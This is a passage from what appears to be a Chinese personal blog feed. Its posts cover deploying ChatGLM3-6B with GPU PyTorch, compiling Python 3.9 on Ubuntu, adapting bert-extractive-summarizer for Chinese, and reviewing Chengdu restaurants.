pytorch-gpu的安装</h2><p>pytorch-gpu的版本同样必须依赖于CUDA的版本。</p><p>注意，<code>conda install pytorch</code> 命令安装的是torch CPU版本，但是我们要使用GPU进行训练</p><p>在<a href="https://pytorch.org/get-started/previous-versions/">pytorch官网</a>上获取cuda11.8对应版本torch的安装命令</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122103348292.png" alt="image-20240122103348292" /></p><p>复制对应的命令，执行安装</p><p>安装完成后编写程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch <span class="comment"># 如果pytorch安装成功即可导入</span></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available()) <span class="comment"># 查看CUDA是否可用</span></span><br><span class="line"><span class="built_in">print</span>(torch.cuda.device_count()) <span class="comment"># 查看可用的CUDA数量</span></span><br><span class="line"><span class="built_in">print</span>(torch.version.cuda) <span class="comment"># 查看CUDA版本</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122195902702.png" alt="image-20240122195902702" /></p><p>已经配置成功</p><h2 id="安装剩余依赖"><a class="markdownIt-Anchor" href="#安装剩余依赖"></a> 安装剩余依赖</h2><p>clone下来ChatGLM3项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/THUDM/ChatGLM3.git</span><br></pre></td></tr></table></figure><blockquote><p>超时的话挂梯子设置代理，使用服务器没办法挂梯子的话直接在github下载zip上传到服务器上</p></blockquote><p>由于已经安装了torch，所以我们要<strong>删掉项目目录下requirements.txt中的 <em>torch&gt;=2.1.0</em> 一行</strong></p><p>并使用 pip 安装剩余的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><blockquote><p>这里一定要删除torch相关依赖行！！不然会自动给你下载冲突的torch版本，后续项目报错</p></blockquote><h1 id="下载chatglm3-6b模型及参数"><a class="markdownIt-Anchor" href="#下载chatglm3-6b模型及参数"></a> 下载ChatGLM3-6b模型及参数</h1><h2 id="方法1从-hugging-face-hub-下载模型"><a class="markdownIt-Anchor" href="#方法1从-hugging-face-hub-下载模型"></a> 方法1：从 Hugging Face Hub 下载模型</h2><p>首先需要安装Git LFS，否则会出现模型中的大型文件下载不完整的情况。</p><p>输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br></pre></td></tr></table></figure><p>若显示 <code>Git LFS initialized</code> ，说明已经安装。</p><p>可以使用git进行克隆，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://huggingface.co/THUDM/chatglm3-6b</span><br></pre></td></tr></table></figure><p>如果下载比较慢或者超时，可以直接去<a href="https://huggingface.co/THUDM/chatglm3-6b">官网</a>下载模型再上传到服务器</p><h2 id="方法2从-modelscope-下载模型推荐"><a class="markdownIt-Anchor" href="#方法2从-modelscope-下载模型推荐"></a> 方法2：从 ModelScope 下载模型（推荐）</h2><p>同样也可以在国内魔搭社区下载，一般不会超时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git lfs install</span><br><span class="line">git clone https://www.modelscope.cn/ZhipuAI/chatglm3-6b.git</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里一定要<code>git lfs install</code>，虽然我查了这个命令仅仅只是用于验证是否安装了git lfs，但是我第一次从魔搭git clone的时候，没有使用这个命令产生了大文件下载不完整的情况，加上后没有再出现这样的问题，所以建议还是加上吧。</p></blockquote><h1 id="代码调用模型进行预测"><a class="markdownIt-Anchor" href="#代码调用模型进行预测"></a> 代码调用模型进行预测</h1><p>下载完成模型及参数文件后，我们将所有的文件放在一个文件夹<code>chatglm3-6b</code>里，然后将其放在项目文件夹ChatGLM3-main下</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122202232999.png" alt="image-20240122202232999" /></p><p>然后我们可以在项目主目录下创建test.py文件，通过如下代码调用 ChatGLM 模型来生成对话：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModel</span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;chatglm3-6b/&quot;</span>, trust_remote_code=<span class="literal">True</span>)</span><br><span class="line">model = AutoModel.from_pretrained(<span class="string">&quot;chatglm3-6b/&quot;</span>, trust_remote_code=<span class="literal">True</span>, device=<span class="string">&#x27;cuda&#x27;</span>)</span><br><span class="line">model = model.<span class="built_in">eval</span>()</span><br><span class="line">response, history = model.chat(tokenizer, <span class="string">&quot;你好&quot;</span>, history=[])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;回答：&quot;</span>,response)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要根据上下文的情况下</span></span><br><span class="line"><span class="comment"># response, history = model.chat(tokenizer, &quot;晚上睡不着应该怎么办&quot;, history=history)</span></span><br><span class="line"><span class="comment"># print(response)</span></span><br></pre></td></tr></table></figure><blockquote><p>这里使用&quot;chatglm3-6b/&quot;就是加载了该文件夹下的本地模型及文件</p></blockquote><p>在命令行输入，执行代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=1 python test.py</span><br></pre></td></tr></table></figure><blockquote><p>注意，这里的 <code>CUDA_VISIBLE_DEVICES=1</code> 的作用是指定使用 GPU 1 来跑模型，因为我们前面已经通过 <code>nvidia-smi</code> 知道 GPU 0 的显存已经基本占满了</p><p>cuda指定GPU、设置多GPU的方法：<a href="https://blog.csdn.net/OneQuestionADay/article/details/111691486">https://blog.csdn.net/OneQuestionADay/article/details/111691486</a></p></blockquote><h1 id="构建网页版demo"><a class="markdownIt-Anchor" href="#构建网页版demo"></a> 构建网页版demo</h1><p>官方教程：<a href="https://github.com/THUDM/ChatGLM3/blob/main/composite_demo/README.md">https://github.com/THUDM/ChatGLM3/blob/main/composite_demo/README.md</a></p><p>安装 Jupyter 内核：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipython kernel install --name chatglm3-demo --user</span><br></pre></td></tr></table></figure><p>因为我们是本地下载的模型，所以需要先设置环境变量 <code>MODEL_PATH</code> 来指定从本地加载模型</p><p>直接在终端中输入如下命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export MODEL_PATH=//home/xjb/event/ChatGLM3-main/chatglm3-6b</span><br></pre></td></tr></table></figure><p>然后输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUDA_VISIBLE_DEVICES=1 streamlit run composite_demo/main.py</span><br></pre></td></tr></table></figure><blockquote><p>注意这里一样要在命令的前面加上 <code>CUDA_VISIBLE_DEVICES=1</code> 来设置使用的GPU</p></blockquote><p>运行结果：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122204008879.png" alt="image-20240122204008879" /></p><p>如果你部署在了服务器上而不是本机，访问对应的network url既可使用网页demo</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240122204313569.png" alt="image-20240122204313569" /></p><p>现在你就拥有一个属于自己的本地大模型啦，因为该模型较轻量级，预测的速度还是比较快的，在未经过微调的情况下我直接将其用于新闻文本的摘要任务，大概1-2秒可以生成一篇文本的摘要，效果也比较不错，但是偶尔会出现中英文乱码的情况。</p><p>你也可以对其进行进一步的领域微调，使其更适合你的任务。</p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><ul><li><p><a href="https://blog.csdn.net/qq_43705697/article/details/121618276">https://blog.csdn.net/qq_43705697/article/details/121618276</a></p></li><li><p><a href="https://blog.csdn.net/2301_80501457/article/details/134191613">https://blog.csdn.net/2301_80501457/article/details/134191613</a></p></li><li><p><a href="https://blog.csdn.net/m0_65814643/article/details/134510135?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_65814643/article/details/134510135?spm=1001.2014.3001.5501</a></p></li><li><p><a href="https://blog.csdn.net/m0_65814643/article/details/134563092">https://blog.csdn.net/m0_65814643/article/details/134563092</a></p></li><li><p><a href="https://blog.csdn.net/OneQuestionADay/article/details/111691486">https://blog.csdn.net/OneQuestionADay/article/details/111691486</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『linux』ubuntu修改python版本</title>
      <link href="/posts/3bee.html"/>
      <url>/posts/3bee.html</url>
      
        <content type="html"><![CDATA[<p><strong>motivation：</strong></p><p>服务器系统为：ubuntu20.04</p><p>查看系统中自带的python版本，可以发现系统自带的python3版本为python3.8。</p><p>因为我们需要在服务器部署的项目依赖python版本&gt;=3.9，与Python3.8不兼容，所以需要安装python3.9。</p><p>本文详细记录在Ubuntu20.04（其他版本步骤也一样）上编译安装指定版本Python解释器的过程和可能遇到的问题，及多个Python版本并存的使用方法。</p><h1 id="安装依赖"><a class="markdownIt-Anchor" href="#安装依赖"></a> 安装依赖</h1><p>初次安装的时候，没有执行这个步骤，后续踩了比较多的坑，参考网上的文章后执行此步骤可以解决大部分的问题。</p><h2 id="更新系统软件"><a class="markdownIt-Anchor" href="#更新系统软件"></a> 更新系统软件</h2><p>在正式开始之前，建议首先检查系统软件是否均为最新，并更新到最新版本。</p><p>打开一个终端，输入以下命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 刷新软件包目录</span><br><span class="line">sudo apt update</span><br><span class="line"># 列出当前可用的更新</span><br><span class="line">sudo apt list --upgradable</span><br><span class="line"># 如上一步提示有可以更新的项目，则执行更新</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111170901524.png" alt="image-20240111170901524" /></p><h2 id="安装gcc编译器"><a class="markdownIt-Anchor" href="#安装gcc编译器"></a> 安装GCC编译器</h2><p>打开一个终端，使用 apt 安装 GCC 编译器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 GCC 编译器</span></span><br><span class="line">sudo apt install gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查安装是否成功</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 若显示出 GCC 版本则成功</span></span><br></pre></td></tr></table></figure><h2 id="安装其他依赖"><a class="markdownIt-Anchor" href="#安装其他依赖"></a> 安装其他依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 刷新软件包目录</span></span><br><span class="line">sudo apt update</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">sudo apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev libbz2-dev liblzma-dev sqlite3 libsqlite3-dev tk-dev uuid-dev libgdbm-compat-dev</span><br></pre></td></tr></table></figure><p>注意，Python 的部分功能依赖于对应的库（如 OpenSSL、SQLite3、LZMA 等），如果在编译时未能找到这些库，仍然可能完成编译。此时的 Python 解释器看似可以工作，但在需要使用特定功能时就会出问题。例如 OpenSSL 出现问题会导致无法正常使用 pip。故建议按本节提示安装所有可选依赖项。</p><h1 id="查看系统自带python3版本"><a class="markdownIt-Anchor" href="#查看系统自带python3版本"></a> 查看系统自带python3版本</h1><p>在系统终端中输入：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/bin | grep python</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165216118.png" alt="image-20240111165216118" /></p><p>可以看出使用系统的Python3指向版本python3.8</p><p>输入python3 --version可以查看详细版本信息</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165421131.png" alt="image-20240111165421131" /></p><h1 id="下载安装python39"><a class="markdownIt-Anchor" href="#下载安装python39"></a> 下载安装python3.9</h1><h2 id="下载与解压"><a class="markdownIt-Anchor" href="#下载与解压"></a> 下载与解压</h2><p>在<a href="https://www.python.org/ftp/python/%E4%B8%8B%E6%89%BE%E5%88%B0%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E5%AE%89%E8%A3%85%E7%9A%84python3.9%E7%89%88%E6%9C%AC%E7%9A%84tgz%E5%AE%89%E8%A3%85%E5%8C%85">https://www.python.org/ftp/python/下找到我们想要安装的python3.9版本的tgz安装包</a></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111165757616.png" alt="image-20240111165757616" /></p><p>在终端中通过wget命令下载我们选择的安装包</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://www.python.org/ftp/python/<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>/Python-<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure><p>解压安装包并进入目录（我这里选择解压到根目录下，读者可以自行选择解压路径）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf Python-<span class="number">3</span>.<span class="number">9</span>.<span class="number">0</span>.tgz -C ~</span><br><span class="line"><span class="built_in">cd</span> Python-<span class="number">3</span>.<span class="number">8</span>.<span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="配置"><a class="markdownIt-Anchor" href="#配置"></a> 配置</h2><p>在Python-3.8.5目录下：</p><p>配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure</span><br></pre></td></tr></table></figure><p>编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make altinstall</span><br></pre></td></tr></table></figure><blockquote><p>这里使用应使用 <code>altinstall</code> 而不是 <code>install</code> 。</p><p>二者的一个重要区别在于，后者会创建符号链接，将 <code>python3</code> 等命令链接到正在安装的新版本 Python 3 上，这可能会破坏系统。更多信息请参阅当前目录下的 <code>README.rst</code> 文件。</p></blockquote><h1 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h1><p><strong>有的文章可能会在这里让你删除掉原有的python环境或者是修改python3命令指向新安装的python3.8环境，由于 Ubuntu 系统、安装的其他软件等很可能会依赖于系统原有的python环境等原因，都不要进行此类修改！！！</strong></p><p>下面对安装完成的python环境进行测试</p><p>在命令行输入python3.9（注意不要分开），可以看到已经成功安装了。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111172737068.png" alt="image-20240111172737068" /></p><p>如果要在python3.9环境下安装库的话，使用pip3.9即可</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111173117603.png" alt="image-20240111173117603" /></p><p>后续如果想用python3.9环境来执行代码的话，在前面加上python3.9即可</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240111173227176.png" alt="image-20240111173227176" /></p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/506491209">https://zhuanlan.zhihu.com/p/506491209</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> unbuntu </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『探店』成都探店</title>
      <link href="/posts/1e32.html"/>
      <url>/posts/1e32.html</url>
      
        <content type="html"><![CDATA[<p>在成都求学的这几年间吃过的一些比较好吃的店铺。</p><h1 id="川菜"><a class="markdownIt-Anchor" href="#川菜"></a> 川菜</h1><h2 id="鸡毛店"><a class="markdownIt-Anchor" href="#鸡毛店"></a> 鸡毛店</h2><ul><li><p>地点：天府宏</p></li><li><p>人均：50</p></li><li><p>评价：去过好几次了，味道很不错，注意有的店也叫鸡毛店但不一样，我一般常去天府宏的</p></li><li><p>推荐菜：</p><ul><li><p>蒜蓉生焖虾：必点，非常好吃</p></li><li><p>鸡丝凉面</p></li></ul></li></ul><h2 id="明婷饭店"><a class="markdownIt-Anchor" href="#明婷饭店"></a> 明婷饭店</h2><ul><li>地点：去过两个分店，都还可以</li><li>人均：60</li><li>评价：便宜，味道很不错，性价比高。</li><li>推荐菜：<ul><li>脑花豆腐：必点，特别下饭</li><li>奇香排骨：招牌</li></ul></li></ul><h2 id="陈麻婆豆腐"><a class="markdownIt-Anchor" href="#陈麻婆豆腐"></a> 陈麻婆豆腐</h2><ul><li>地点：总店在杜甫草堂对面</li><li>人均：60</li><li>评价：麻婆豆腐非常好吃，其他菜一般般。建议去总店！</li><li>推荐菜：<ul><li>麻婆豆腐，非遗</li></ul></li></ul><h2 id="永乐饭店"><a class="markdownIt-Anchor" href="#永乐饭店"></a> 永乐饭店</h2><ul><li>地点：武侯区</li><li>人均：50</li><li>评价：便宜好吃，网上评价都比较好，暂时没吃过</li><li>推荐菜：<ul><li>照着招牌点就行</li></ul></li></ul><h1 id="翘脚牛肉"><a class="markdownIt-Anchor" href="#翘脚牛肉"></a> 翘脚牛肉</h1><h2 id="冯四嬢翘脚牛肉"><a class="markdownIt-Anchor" href="#冯四嬢翘脚牛肉"></a> 冯四嬢翘脚牛肉</h2><ul><li>地点：世豪广场</li><li>人均：30</li><li>评价：价格比较便宜，牛肉很新鲜。</li><li>推荐菜：<ul><li>翘脚牛肉</li><li>鲜血旺</li><li>粉蒸牛肉</li></ul></li></ul><h1 id="烧烤"><a class="markdownIt-Anchor" href="#烧烤"></a> 烧烤</h1><h2 id="新奥尔良烧烤"><a class="markdownIt-Anchor" href="#新奥尔良烧烤"></a> 新奥尔良烧烤</h2><ul><li>地点：这家店地图上搜不到，可以搜索玉林西路的生火火地摊小炉子烧烤，在对面</li><li>人均：60</li><li>评价：烤翅神中神，其他的也不错</li><li>推荐菜：<ul><li>烤翅</li><li>让老板娘帮着拿，都不错</li></ul></li></ul><h1 id="美蛙鱼"><a class="markdownIt-Anchor" href="#美蛙鱼"></a> 美蛙鱼</h1><h2 id="蓉城霜霜"><a class="markdownIt-Anchor" href="#蓉城霜霜"></a> 蓉城霜霜</h2><ul><li>地点：连锁店，哪里都有</li><li>人均：60</li><li>评价：自助，吃美蛙鱼就去这</li></ul><h1 id="冒烤鸭"><a class="markdownIt-Anchor" href="#冒烤鸭"></a> 冒烤鸭</h1><h2 id="回味冒烤鸭"><a class="markdownIt-Anchor" href="#回味冒烤鸭"></a> 回味冒烤鸭</h2><ul><li>地点：回味冒烤鸭（川大店）</li><li>人均：20</li><li>评价：价格便宜，好吃</li></ul><h1 id="火锅"><a class="markdownIt-Anchor" href="#火锅"></a> 火锅</h1><p>感觉火锅味道都差不多？</p><h2 id="矮板凳"><a class="markdownIt-Anchor" href="#矮板凳"></a> 矮板凳</h2><ul><li>地点：连锁，哪里都有</li><li>人均：70</li><li>评价：实验室聚餐去吃过几次，味道还可以，价格也还行</li></ul><h2 id="星鸿社"><a class="markdownIt-Anchor" href="#星鸿社"></a> 星鸿社</h2><ul><li>地点：建设路/电子科技大学</li><li>人均：100+</li><li>评价：一家重庆老火锅，味道很好，但是价格比较贵。</li></ul><h1 id="串串"><a class="markdownIt-Anchor" href="#串串"></a> 串串</h1><h2 id="六年二班串串"><a class="markdownIt-Anchor" href="#六年二班串串"></a> 六年二班串串</h2><ul><li><p>地点：人民公园店</p></li><li><p>人均：40</p></li><li><p>评价：成都朋友推荐，还没去过。</p></li></ul><h1 id="小龙虾"><a class="markdownIt-Anchor" href="#小龙虾"></a> 小龙虾</h1><h2 id="龙虾一绝"><a class="markdownIt-Anchor" href="#龙虾一绝"></a> 龙虾一绝</h2><ul><li>地点：玉林西路</li><li>人均：70</li><li>评价：本地人舍友推荐的一家龙虾店，去吃过一次，价格较贵，感觉一般般，也有可能是我点的是微辣的原因。</li></ul><h1 id="小吃"><a class="markdownIt-Anchor" href="#小吃"></a> 小吃</h1><h2 id="建设北路"><a class="markdownIt-Anchor" href="#建设北路"></a> 建设北路</h2><ul><li><p>烤苕皮</p></li><li><p>油条糯米糍（不叫这个，具体叫啥忘了）：个人觉得非常好吃，每次去都买一个肉松味的。</p></li><li><p>冰粉：一般吃火锅买一个。</p></li><li><p>冰豆花</p></li><li><p>蛋烘糕</p></li><li><p>成都市很好吃的火锅粉：推荐脑花、火锅粉。</p></li><li><p>钵钵鸡</p></li><li><p>担担面</p></li></ul><h2 id="宽菜日记"><a class="markdownIt-Anchor" href="#宽菜日记"></a> 宽菜日记</h2><ul><li>推荐菜：<ul><li>甜皮鸭：建议买来后1-2小时内吃，放久了就不好吃了。</li></ul></li></ul><h2 id="蹄花"><a class="markdownIt-Anchor" href="#蹄花"></a> 蹄花</h2><ul><li><p>吴氏蹄花：川大望江校区附近，便宜好吃，推荐雪豆蹄花汤+铁板烧。</p></li><li><p>无名蹄花：大众点评必吃榜上的，暂时没吃过。</p></li></ul><h1 id="不推荐"><a class="markdownIt-Anchor" href="#不推荐"></a> 不推荐</h1><h2 id="陶德砂锅"><a class="markdownIt-Anchor" href="#陶德砂锅"></a> 陶德砂锅</h2><p>网红店。很一般，本地人都不推荐的店</p><h2 id="烤匠"><a class="markdownIt-Anchor" href="#烤匠"></a> 烤匠</h2><p>本人去过好几次，感觉也是比较一般，而且偏贵，推荐菜：芝士烤红薯</p><h2 id="冒椒火辣"><a class="markdownIt-Anchor" href="#冒椒火辣"></a> 冒椒火辣</h2><p>网红店。小菜很好吃（脑花好吃），但是串串感觉味道很一般，偏贵</p><h2 id="饕林餐厅"><a class="markdownIt-Anchor" href="#饕林餐厅"></a> 饕林餐厅</h2><p>网红店。个人觉得很一般，而且偏贵。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美食 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『工程记录』修改bert-extractive-summarizer项目用于中文文本摘要任务</title>
      <link href="/posts/fbe6.html"/>
      <url>/posts/fbe6.html</url>
      
        <content type="html"><![CDATA[<h1 id="motivation"><a class="markdownIt-Anchor" href="#motivation"></a> motivation</h1><p>本文为bert-extractive-summarizer项目改中文模型记录</p><ul><li><p>主页文档：<a href="https://pypi.org/project/bert-extractive-summarizer/">https://pypi.org/project/bert-extractive-summarizer/</a></p></li><li><p>github项目地址：<a href="https://github.com/dmmiller612/bert-extractive-summarizer">https://github.com/dmmiller612/bert-extractive-summarizer</a></p></li></ul><p>该模型的原理在于：通过bert生成句子嵌入，对句子嵌入做聚类，找到最接近聚类质心的句子，同时使用<a href="https://github.com/huggingface/neuralcoref">neuralcoref</a>库实现共指消解功能（比较符合目前的业务，项目数据集中的政治新闻大多系外媒台媒文章，不像国内的文章那样规范，行文比较随意，同时因为外文翻译为中文存在一些语句翻译质量低，所以存在很多的指代问题）</p><p>发现原始模型做的是英文的摘要生成，要进行中文摘要需要将其修改成中文的Bert模型和分词器，参考作者给出的<a href="https://geek.digiasset.org/pages/nlp/nlpinfo/bert-text-summarizer-chinese/">中文模型文档</a>和github下的<a href="https://github.com/dmmiller612/bert-extractive-summarizer/issues/45">issue</a>完成了中文摘要的提取。</p><h1 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h1><h2 id="spacy-neuralcoref-搭建共指消解环境"><a class="markdownIt-Anchor" href="#spacy-neuralcoref-搭建共指消解环境"></a> spacy + neuralcoref 搭建共指消解环境</h2><p>指代消解任务通过<code>spacy + uralcoref</code>实现。spacy是一个NLP领域的文本预处理Python库，包括分词、词性标注、依存分析等多个nlp基础任务的实现，neuralcoref相当于一个插件，在spacy框架下实现指代消解。</p><p>我在初次安装过程中<strong>出现了Spacy和neuralcoref的版本适配问题</strong>，安装很多版本都不能顺利运行，各种error。最终找到一个匹配的安装方式，按照下面的流程来进行安装的话应该不会出现兼容性的问题。</p><p>如果你是<strong>英文任务</strong>的话，推荐：<strong>spacy 2.1.0 + neuralcoref 4.0 + en_core_web_sm-2.1.0</strong></p><blockquote><p>但是这一套对中文模型版本并不适用， neuralcoref并不支持中文共指消解。所以对中文任务而言，如果要使用这里的共指消解，需要使用其他的支持中文的共指消解工具。</p><p>因此<strong>我们后面的中文摘要生成部分并没有使用共指消解，后续有机会可以尝试加上</strong></p></blockquote><p>我们先pip install spacy==2.1.0，前面提到neuralcoref相当于spaCy的一个插件，所以先安装neuralcoref会自动帮我们安装 spacy，可能会产生版本冲突。</p><p>接下来安装spacy 2.1.0版本库上的 transformer-based pipelines 的预训练模型 en_core_web_sm-2.1.0，<strong>注意这里的版本一定要和前面的spacy一样</strong>，产生报错建议手动安装</p><p>安装完spacy后安装neuralcoref，<strong>建议这里去pypi上找到对应的 <a href="https://pypi.org/project/neuralcoref/#files">neuralcoref包</a> 下载到本地后手动安装</strong>，不然可能会产生下面的报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231215165152653.png" alt="image-20231215165152653" /></p><h2 id="搭建-bert-extractive-summarizer-环境"><a class="markdownIt-Anchor" href="#搭建-bert-extractive-summarizer-环境"></a> 搭建 bert-extractive-summarizer 环境</h2><p>首先从github上clone该项目</p><p>然后运行一个小demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> summarizer <span class="keyword">import</span> Summarizer</span><br><span class="line"></span><br><span class="line">body = <span class="string">&quot;This repo is the generalization of the lecture-summarizer repo. This tool utilizes the HuggingFace Pytorch transformers library to run extractive summarizations. This works by first embedding the sentences, then running a clustering algorithm, finding the sentences that are closest to the cluster&#x27;s centroids. This library also uses coreference techniques, utilizing the https://github.com/huggingface/neuralcoref library to resolve words in summaries that need more context. The greedyness of the neuralcoref library can be tweaked in the CoreferenceHandler class.As of the most recent version of bert-extractive-summarizer, by default, CUDA is used if a gpu is available.&quot;</span></span><br><span class="line">model = Summarizer()</span><br><span class="line">result = model(body, num_sentences=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>下载好相应的依赖后发现出现报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218101532243.png" alt="image-20231218101532243" /></p><p>这里的报错原因在于：代码试图从Hugging Face模型存储库（<a href="https://huggingface.co">https://huggingface.co</a>）下载模型文件，但由于网站不稳定等原因无法连接到该服务器。</p><blockquote><p>在使用Hugging Face Transformers库时（很多需要用到某些模型的机器学习库都是这样），如果你指定的模型没有在本地缓存中找到，库会尝试从Hugging Face模型存储库下载所需的模型文件，以便进行后续的模型初始化和使用。这是因为模型文件通常比较大，不方便直接包含在库中，因此在需要时会动态下载。</p></blockquote><p>因此这里我们选择手动下载模型</p><h2 id="手动下载中文模型"><a class="markdownIt-Anchor" href="#手动下载中文模型"></a> 手动下载中文模型</h2><p>Hugging Face Transformers库所使用的默认bert模型 bert-large-uncased 只可以用于英文语料，如果我们要将该项目应用在中文的摘要任务上需要稍作修改，使用一个中文的bert模型和一个中文的分词器。</p><p>首先我们<strong>手动下载中文的bert模型 bert-base-chinese</strong></p><p>打开Hugging Face的官网搜索我们想要的模型<a href="https://huggingface.co/bert-base-chinese">bert-base-chinese</a>，点击files，下载下面红框内的四个文件，然后根据你使用的框架选择相应的模型文件，如果使用的是pytorch就下载pytorch_model.bin，如果是TensorFlow就换成tf_model.h5，这里我们使用的是pytorch，所以选择pytorch_model.bin进行下载。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218103610166.png" alt="image-20231218103610166" /></p><p>将下载好的文件放在我们的项目目录下，比如我这里建立了一个bert-base-chinese文件夹存放：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218104219354.png" alt="image-20231218104219354" 